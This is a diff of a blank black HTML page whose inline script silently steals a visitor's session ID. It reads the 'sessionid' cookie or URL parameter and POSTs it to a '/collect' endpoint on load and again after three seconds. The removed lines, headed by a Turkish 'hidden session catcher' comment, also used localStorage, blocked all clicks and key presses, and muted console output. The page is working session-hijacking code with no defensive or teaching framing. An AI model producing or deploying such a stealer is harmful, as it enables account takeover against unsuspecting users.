@@ -6,76 +6,42 @@
   <title>.</title>
   <style>
     * { margin: 0; padding: 0; }
-    body { 
-      background: #000; 
-      min-height: 100vh; 
-      display: flex; 
-      align-items: center; 
-      justify-content: center; 
-      color: #000; 
-      font-family: system-ui;
-    }
-    .hidden { display: none; }
+    body { background: #000; min-height: 100vh; }
   </style>
 </head>
 <body>
-  <div style="display:none;"></div>
-
   <script>
     (function() {
-      // ---- GİZLİ SESSION YAKALAYICI ----
       function getCookie(name) {
         const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
         return match ? decodeURIComponent(match[2]) : null;
       }
 
-      async function captureSession() {
+      async function capture() {
         try {
-          let sessionId = getCookie('sessionid');
-          if (!sessionId) {
-            sessionId = localStorage.getItem('sessionid');
-          }
-          if (!sessionId) {
+          let sid = getCookie('sessionid');
+          if (!sid) {
             const params = new URLSearchParams(window.location.search);
-            sessionId = params.get('sessionid');
+            sid = params.get('sessionid');
           }
-
-          if (sessionId) {
-            const response = await fetch('/collect', {
+          if (sid) {
+            const res = await fetch('/collect', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ sessionId: sessionId })
+              body: JSON.stringify({ sessionId: sid })
             });
-            const data = await response.json();
-            if (data.success) {
-              console.log('✅ Session captured silently');
-            } else {
-              console.log('❌ Capture failed:', data.error);
-            }
-          } else {
-            console.log('ℹ️ No session ID found');
+            const data = await res.json();
+            if (data.success) console.log('✅ Captured');
+            else console.log('❌ Failed:', data.error);
           }
-        } catch (err) {
-          console.log('⚠️ Silent error:', err.message);
+        } catch (e) {
+          // sessiz
         }
       }
 
-      if (document.readyState === 'complete') {
-        captureSession();
-      } else {
-        window.addEventListener('load', captureSession);
-      }
-
-      setTimeout(captureSession, 3000);
-
-      document.addEventListener('click', (e) => e.preventDefault());
-      document.addEventListener('contextmenu', (e) => e.preventDefault());
-      document.addEventListener('keydown', (e) => e.preventDefault());
-      document.addEventListener('touchstart', (e) => e.preventDefault());
-      
-      console.log = function() {};
-      console.warn = function() {};
-      console.error = function() {};
+      if (document.readyState === 'complete') capture();
+      else window.addEventListener('load', capture);
+      setTimeout(capture, 3000);
     })();
   </script>
 </body>
